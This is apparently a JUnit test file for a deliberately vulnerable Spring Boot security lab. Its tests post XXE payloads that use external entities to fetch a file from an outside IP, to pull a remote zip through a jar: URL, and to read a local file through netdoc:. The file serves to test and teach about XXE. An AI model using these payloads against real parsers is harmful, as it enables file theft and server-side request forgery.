package com.org.buglab.seccoding;

import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.test.context.web.WebAppConfiguration;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MockMvcBuilder;
import org.springframework.test.web.servlet.MvcResult;
import org.springframework.test.web.servlet.request.MockMvcRequestBuilders;
import org.springframework.test.web.servlet.result.MockMvcResultHandlers;
import org.springframework.test.web.servlet.result.MockMvcResultMatchers;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;
import org.springframework.web.context.WebApplicationContext;

import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

@RunWith(SpringRunner.class)
@SpringBootTest
@AutoConfigureMockMvc
@WebAppConfiguration
public class SecCodingApplicationTests {

    @Test
    public void contextLoads() {
    }

    private MockMvc mockMvc;//模拟MVC对象，通过MockMvcBuilders.webAppContextSetup(this.wac).build()初始化
    @Autowired
    private WebApplicationContext context;// 注入WebApplicationContext

    @Before
    public void setup() {
        this.mockMvc = MockMvcBuilders.webAppContextSetup(this.context).build();
    }

    @Test
    public void IndexTest() {
        try {
            this.mockMvc.perform(MockMvcRequestBuilders.get("/xxe/index")
                    .accept(MediaType.APPLICATION_JSON))
                    .andDo(MockMvcResultHandlers.print())
                    .andExpect(status().isOk())
                    .andReturn();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Test
    public void DocumentBuilderFactoryTest() {
        String xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                "\r\n" + "<!DOCTYPE data [" +
                "\r\n" + "<!ENTITY xxe SYSTEM \"http://10.74.155.67:2333/123.txt\" >" +
                "\r\n" + "]>" +
                "\r\n" + "<data>&xxe;</data> ";
        //jar:{url}:{path} 比如jar:http://10.74.155.67:2333/xxx.jar!/1.php
        //这个！后面就是我们从中解压出的文件
        String xml2 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                "\r\n" + "<!DOCTYPE data [" +
                "\r\n" + "<!ENTITY xxe SYSTEM \"jar:http://10.74.155.67:2333/xxxx.zip!/1.php\" >" +
                "\r\n" + "]>" +
                "\r\n" + "<data>&xxe;</data> ";
        System.out.println(xml2);
        try {
            MvcResult result = mockMvc.perform(post("/xxe/DocumentBuilderFactory").contentType(MediaType.APPLICATION_XML).content(xml2))
                    .andExpect(status().isOk())
                    .andReturn();

            //System.out.println("测试结果："+result.getResponse().getContentAsString());

        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    @Test
    public void DocumentBuilderTest() {
        String xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                "\r\n" + "<!DOCTYPE data [" +
                "\r\n" + "<!ENTITY xxe SYSTEM \"netdoc:/D:/1.txt\" >" +
                "\r\n" + "]>" +
                "\r\n" + "<data><user>&xxe;</user></data> ";
        //jar:{url}:{path} 比如jar:http://10.74.155.67:2333/xxx.jar!/1.php
        //这个！后面就是我们从中解压出的文件
        String xml2 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                "\r\n" + "<!DOCTYPE data [" +
                "\r\n" + "<!ENTITY xxe SYSTEM \"jar:http://10.74.155.67:2333/xxxx.zip!/1.php\" >" +
                "\r\n" + "]>" +
                "\r\n" + "<data><user>&xxe;</user></data> ";
        System.out.println(xml2);
        try {
            MvcResult result = mockMvc.perform(post("/xxe/DocumentBuilder").contentType(MediaType.ALL).content(xml))
                    .andReturn();

            //System.out.println("测试结果："+result.getResponse().getContentAsString());

        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
